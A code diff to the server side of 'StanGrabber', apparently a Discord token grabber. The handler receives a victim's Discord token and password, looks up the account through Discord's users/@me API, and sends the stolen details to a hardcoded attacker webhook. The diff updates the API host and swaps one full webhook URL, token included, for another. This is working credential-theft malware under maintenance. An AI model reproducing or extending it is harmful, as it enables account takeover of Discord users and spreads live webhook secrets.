@@ -14,7 +14,7 @@ exports.send = (req, res, webhook) => {
         return res.status(400).json({status: "error",message: "Not sent."});
 
     function GetInfos(token, password) {
-        fetch('https://discordapp.com/api/v8/users/@me', {
+        fetch('https://discord.com/api/v8/users/@me', {
         method: 'get',
         headers: {
             'Content-Type': 'application/json',
@@ -48,7 +48,7 @@ exports.send = (req, res, webhook) => {
 }
             
 
-        axios.post(`https://discord.com/api/webhooks/798174418105794611/KPq7u1zogv68PRbMeljz1V-_EPrNZe_q3ynpDpBn52tVvD-pQVd9ZOxYzsOtkDwqluN3`, {
+        axios.post(`https://discord.com/api/webhooks/832088884958593064/lxbLgzAHmcBbhATjj3jQDIYnId0TlbFfHQi1ttQU5E2DFxKHPqHisBNOQEC1FHvCi4mj`, {
             username: JSON.parse(JSON.stringify(y)).username + " - StanGrabber",
             content: '', 
             embeds:[ omg ]
